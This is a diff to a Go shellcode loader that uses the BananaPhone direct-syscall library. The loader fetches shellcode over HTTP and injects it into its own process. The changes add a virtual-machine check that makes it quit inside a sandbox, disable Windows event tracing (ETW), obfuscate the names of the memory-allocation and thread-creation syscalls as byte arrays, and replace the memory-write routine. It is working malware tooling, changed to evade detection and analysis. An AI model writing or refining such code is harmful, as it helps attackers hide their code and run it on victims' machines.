@@ -29,6 +29,13 @@ var (
 // https://github.com/C-Sto/BananaPhone
 
 func main() {
+	if malwareUtil.VmCheck() {
+		return
+	}
+	//get the current process handle
+	handle := windows.CurrentProcess()
+	//disable etw for the current process
+	malwareUtil.EtwHell(uintptr(handle))
 	//get the shellcode by http
 	conf := strings.Split(t, ",")
 	//initial recon
@@ -73,9 +80,9 @@ func inject(shellcode []byte) {
 	//from https://github.com/C-Sto/BananaPhone/blob/master/example/calcshellcode/main.go
 	bp, _ := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
 	//resolve the functions and extract the syscalls
-	alloc, _ := bp.GetSysID("NtAllocateVirtualMemory")
-	protect, _ := bp.GetSysID("NtProtectVirtualMemory")
-	createthread, _ := bp.GetSysID("NtCreateThreadEx")
+	alloc, _ := bp.GetSysID(string([]byte{'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'}))
+	protect, _ := bp.GetSysID(string([]byte{'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'}))
+	createthread, _ := bp.GetSysID(string([]byte{'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x'}))
 
 	createThread(shellcode, uintptr(0xffffffffffffffff), alloc, protect, createthread)
 }
@@ -92,9 +99,9 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
 		windows.PAGE_READWRITE,
 	)
-	malwareUtil.Etw(handle)
 	//write memory
-	bananaphone.WriteMemory(shellcode, baseA)
+	//bananaphone.WriteMemory(shellcode, baseA)
+	malwareUtil.Memcpy(baseA, shellcode)
 	var oldprotect uintptr
 	bananaphone.Syscall(
 		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
